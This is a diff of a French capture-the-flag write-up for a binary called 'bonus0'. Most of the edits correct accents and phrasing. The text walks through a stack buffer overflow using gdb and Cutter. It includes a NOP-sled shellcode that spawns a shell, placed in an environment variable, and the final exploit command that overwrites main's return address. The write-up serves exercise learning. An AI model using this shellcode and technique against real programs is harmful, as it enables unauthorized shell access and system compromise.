@@ -1,6 +1,6 @@
 # Bonus0
 
-On observe un executable a la racine `bonus0`
+On observe un exécutable à la racine : `bonus0`
 
 ```shell
 $ ./bonus0
@@ -19,7 +19,7 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��� AAAAAAAAAAAAAAAAAAAA���
 Segmentation fault (core dumped)
 ```
 
-On cherche donc a comprendre ce que fait l'executable
+On cherche donc à comprendre ce que fait l'exécutable
 
 ```shell
 $ gdb bonus0 -q
@@ -115,7 +115,7 @@ Dump of assembler code for function p:
 End of assembler dump.
 ```
 
-On va utiliser `Cutter` pour avoir un idee plus clair de `bonus0`
+On va utiliser `Cutter` pour avoir une idée plus claire de `bonus0`
 
 ```shell
 $ scp -P 4242 -r bonus0@192.168.56.102:/home/user/bonus0/bonus0 .
@@ -123,9 +123,9 @@ $ scp -P 4242 -r bonus0@192.168.56.102:/home/user/bonus0/bonus0 .
 $ ./Cutter-v2.1.2-Linux-x86_64.AppImage bonus0
 ```
 
-_resultat sauvegarde dans [source.md](source.md)_
+_résultat sauvegardé dans [source.md](source.md)_
 
-On peut faire quelque test avec l'executable
+On peut faire quelques tests avec l'exécutable :
 
 ```shell
 $ (python -c 'print("A" * 19)' ; python -c 'print("B" * 19)') | ./bonus0
@@ -144,8 +144,6 @@ $ (python -c 'print("A" * 20)' ; python -c 'print("B" * 20)') | ./bonus0
 AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���
 Segmentation fault (core dumped)
 ```
-
-On remarque que le retour du main est ecraser
 
 ```shell
 (gdb) run
@@ -177,13 +175,15 @@ Breakpoint 1, 0x080485ca in main ()
 0x42424242 in ?? ()
 ```
 
-On peut alors modifier le retour du main et le faire pointer vers une variable d'env que lon va creer de suite
+On remarque que le retour de main est ecrasé.
+
+On peut alors modifier le retour de main et le faire pointer vers une variable d'env qui contient un shellcode.
 
 ```shell
 $ export Shellcode=$(python -c 'print "\x90"*100 +"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80"')
 ```
 
-On va recuperer l'adresse de cette variable d'env
+On récupère l'adresse de cette variable d'env.
 
 ```shell
 (gdb) run
@@ -196,9 +196,9 @@ Program received signal SIGSEGV, Segmentation fault.
 0xbffff7dc: "Shellcode=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Phn/shh//bi\211\343P\211\341P\211\342\260\v̀"
 ```
 
-Le parametre 1 a besoin de faire `20 octets` pour pouvoir avoir le comportement souhaite
+Le paramètre 1 doit faire `20 caractères` pour obtenir le comportement souhaité.
 
-On cherche maintenant quel endroit du parametre 2 modifi la valeur de return du main
+On cherche maintenant quel endroit du paramètre 2 modifie la valeur de return du main :
 
 ```shell
 (gdb) break *main+39
@@ -218,9 +218,7 @@ Breakpoint 1, 0x080485cb in main ()
 
 On se rend compte que l'adresse: `0x6d6c6b6a => jklm`
 
-Notre deuxieme parametre aura donc la forme suivant: `"B"*9 + "AddressShellCode" + "B"*7`
-
-on peut alors essayer
+Notre deuxième paramètre aura donc la forme suivante: `"B"*9 + "AddressShellCode" + "B"*7`
 
 ```shell
 $ (python -c 'print("A" * 20)' ; python -c 'print("B" * 9 + "\x59\xf8\xff\xbf" + "B" * 7)';cat) | ./bonus0
